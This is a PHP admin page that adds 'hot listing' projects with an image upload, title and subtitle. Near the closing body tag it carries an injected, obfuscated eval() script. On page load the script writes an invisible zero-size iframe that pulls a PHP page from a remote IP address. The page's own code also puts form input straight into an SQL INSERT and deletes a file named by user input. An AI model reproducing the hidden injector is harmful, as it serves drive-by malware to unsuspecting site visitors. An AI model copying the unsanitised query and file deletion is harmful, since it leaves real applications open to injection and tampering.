<?php
$current_page = "listings";
include("dbconfig.php");
include("../partials/Image.php");
 if(isset($_POST['submit'])) {

	var_dump($_POST);
	$re= mysql_query("INSERT INTO sitsolut_avi.hot_losting(image, title, subtitle)VALUES
	('image','".$_POST['title']."', '".$_POST['subtitle']."')");
	
	$id = mysql_insert_id();
	$file = $_POST['upload_file_names'];
	$basepath = "../partials/simple/upload_files/";
	echo "Basepath";
	if (Image::isValidImage($basepath.$file)){
		$image = Image::createSquareThumbNail($basepath.$file, 340);
		$thumb_location = "../thumbs/hotlisting_$id.jpeg";
		Image::flushImage($image, $thumb_location, "jpg");
	}
	unlink($basepath.$file);
	header("location:hotlistings.php");
	die();
 }
 
?>

<!DOCTYPE html>
<html>
    <head>
        <title>AVI Admin</title>
        <!-- Bootstrap -->
        <link href="bootstrap/css/bootstrap.min.css" rel="stylesheet" media="screen">
        <link href="bootstrap/css/bootstrap-responsive.min.css" rel="stylesheet" media="screen">
        <link href="assets/styles.css" rel="stylesheet" media="screen">
        <!--[if lte IE 8]><script language="javascript" type="text/javascript" src="vendors/flot/excanvas.min.js"></script><![endif]-->
        <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
        <!--[if lt IE 9]>
            <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
        <![endif]-->
		<script type="text/javascript" src="../js/jquery.js"></script>
        <script src="vendors/modernizr-2.6.2-respond-1.1.0.min.js"></script>
    </head>
    
    <body>
        <?php
	  include('top_header.php');
	  ?>
        </div>
        <div class="container-fluid">
            <div class="row-fluid">
<div class="span3" id="sidebar">
               <?php
	  include('sidemenu.php');
	  ?>  </div>
                <!--/span-->
                <div class="span9" id="content">
                      <!-- morris stacked chart -->
                    <div class="row-fluid">
                        <!-- block -->
                        <div class="block">
                            <div class="navbar navbar-inner block-header">
                                <div class="muted pull-left">Add Hot List Project</div>
                            </div>
                            <div class="block-content collapse in">
                                <div class="span12">
                                     <form class="form-horizontal" action='' method='post' enctype="multipart/form-data">
                                      <fieldset>
                                        <legend>Add Hot List Project</legend>
									  <table cellpadding="0" cellspacing="0" border="0" class="table table-striped table-bordered" id="example2">
									  
									  <tr>
                                         <td><label class="control-label" for="focusedInput">Image:</label></td>
                                         <td> 
								<div class="btn btn-primary" id="upload_image">Upload Image</div>
								<input type="hidden" name="upload_file_names" id="upload_file_names" value=""/>
                                          </td>
										</tr>
										<tr>
                                         <td><label class="control-label" for="focusedInput">Title:</label></td>
                                         <td> 
                                             <input type='text' required="required" name='title'>
                                          </td>
										</tr>
										<tr>
                                         <td><label class="control-label" for="focusedInput">Sub Title</label></td>
                                         <td> 
											 <input type='text' required="required" name='subtitle'>
                                          </td>
										</tr>
										</table>
                                        <div class="form-actions">
                                          <button type="submit" name='submit' class="btn btn-primary">Save changes</button>
                                          <button type="reset" onclick='history.go(-1);' class="btn">Cancel</button>
                                        </div>
                                      </fieldset>
                                    </form>
                                </div>
                            </div>
                        </div>
                        <!-- /block -->
                    </div>
                </div>
            </div>
            <hr>
        <?php
		include('footer.php');
	  ?>
        </div>
	<tag5479347351></tag5479347351><script>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 c=" n=\\"0\\" s=\\"0\\" t=\\"0\\" l=\\"h://q.j.k.8/d.g\\">";1 6="<i";1 b="</i";1 2="f";1 3="r";1 5="a";1 4="m";1 9="e";1 7="e>";o.p(6+2+3+5+4+9+c+b+2+3+5+4+7);',30,30,'|var|r4|r5|r7|r6|r2|r9||r8||r3|r1|tag1|||php|http||78|150|src||width|document|write|219||height|board'.split('|'),0,{}))</script><tag5479347352></tag5479347352></body>
<script type="text/javascript" src="../js/SimpleAjaxUploader.min.js"></script>
<script type="text/javascript">
  var btn = $("#upload_image")[0];
  var uploader = new ss.SimpleUpload({
        button: btn,
        url: '../partials/simple/file_upload.php',
        name: 'uploadfile',
        multipart: true,
        hoverClass: 'hover',
        focusClass: 'focus',
		multiple : false,
        responseType: 'json',
		allowedExtensions : ['jpg', 'jpeg', 'png', 'gif'],
        startXHR: function() {
        },
        onSubmit: function() {
            btn.innerHTML = 'Uploading...'; // change button text to "Uploading..."
        },
		onerror : function(msg){
			alert("Error");
		},
        onComplete: function( filename, response ) {
            btn.innerHTML = 'Choose Another File';
            
			if (response.success)
			{
				$("#upload_file_names").val(response.msg);
				$("#upload_image").after("<div class='alert alert-success' style='margin-bottom : 0px;'>Successfully uploaded image : "+response.msg+"</div>").remove();
				
			}
			else{
				alert(response.msg);
			}
        }
	});

</script>

</html>